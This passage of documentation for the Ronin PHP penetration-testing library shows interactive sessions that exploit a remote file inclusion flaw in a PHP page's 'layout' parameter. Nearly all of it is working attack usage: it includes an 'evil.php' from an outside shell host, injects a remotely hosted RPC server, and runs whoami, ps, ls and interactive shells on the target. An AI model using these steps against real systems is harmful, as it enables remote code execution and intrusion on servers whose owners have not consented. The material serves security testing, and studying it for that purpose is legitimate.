            object which can be used to include other PHP files:
          </p>
          <code>&gt;&gt; vuln = url.first_rfi
=&gt; #&lt;Ronin::PHP::RFI:0xb6f0e9dc @param="layout",
@url=#&lt;URI::HTTP:0xfdb7a3d4c URL:http://www.example.com/page.php?layout=default&gt;,
@test_script="http://ronin.rubyforge.org/dist/php/rfi/test.php", @terminate=true&gt;</code>

          <p>Including arbitrary PHP:</p>
          <code>&gt;&gt; vuln.include('http://www.shells4you.com/evil.php')
=> "..."</code>

          <p>
            Using the
            <a href="http://ronin.rubyforge.org/docs/ronin-php/classes/Ronin/RPC/PHP/Client.html">
              PHP Remote Procedure Call
            </a>
            (RPC) interface:
          </p>
          <code>&gt;&gt; client = vuln.rpc
=&gt; #&lt;Ronin::RPC::PHP::Client:0xb7439560 @url="http://www.example.com/page.php?layout=http://ronin.rubyforge.org/dist/php/rpc/server.min.php?",
@session={}, @proxy=nil, @cookie=nil, @user_agent=nil&gt;
&gt;&gt; client.call('shell.exec','whoami')
=&gt; "www"</code>

          <p>Using the PHP-RPC Console service:</p>
          <code>&gt;&gt; php = client.console
=&gt; #&lt;Ronin::RPC::PHP::Console:0xb7437cb0 @name=:console,@client=#&lt;Ronin::RPC::PHP::Client:0xb7439560
@url="http://www.example.com/page.php?layout=http://ronin.rubyforge.org/server.min.php?", @session={},
@proxy=nil, @cookie=nil, @user_agent=nil&gt;&gt;
&gt;&gt; php.phpversion
=&gt; "4.3.10"
&gt;&gt; php.php_uname('-m')
=&gt; "i686"</code>

          <p>Using the PHP-RPC Shell for quick command execution:</p>
          <code>&gt;&gt; shell = client.shell
=&gt; #&lt;Ronin::RPC::PHP::Shell:0xb74364a0 @name=:shell, @client=#&gt;Ronin::RPC::PHP::Client:0xb7439560
@url="http://www.example.com/page.php?layout=http://ronin.rubyforge.org/server.min.php?", @session={},
@proxy=nil, @cookie=nil, @user_agent=nil&gt;&gt;
&gt;&gt; shell.cwd
=&gt; "/var/www/site/\n"
&gt;&gt; shell.cd '..'
=&gt; ""
&gt;&gt; shell.exec('date -u')
=&gt; "Thu Aug 21 10:29:38 UTC 2008\n"
&gt;&gt; shell.system('ps')
   PID TTY          TIME CMD
 27042 pts/8    00:00:00 bash
 27841 pts/8    00:00:00 ps
=&gt; nil</code>

          <p>Using the Interactive Shell for the PHP-RPC Console service:</p>
          <code>&gt;&gt; php.interact
&gt;&gt; phpversion();
=&gt; "4.3.10"
&gt;&gt; explode('|', 'one|two|three');
=&gt; Array(
  "one",
  "two",
  "three"
)
&gt;&gt; exit
=&gt; nil</code>

          <p>Using the Interactive Shell for the PHP-RPC Shell service:</p>
          <code>&gt;&gt; shell.interact
$ pwd
/var/www/site/
$ cd ..
$ ls -la
...
$ exit
=&gt; nil</code>
        </subsection>
      </section>
    </content>
  </page>
</rubyforge>
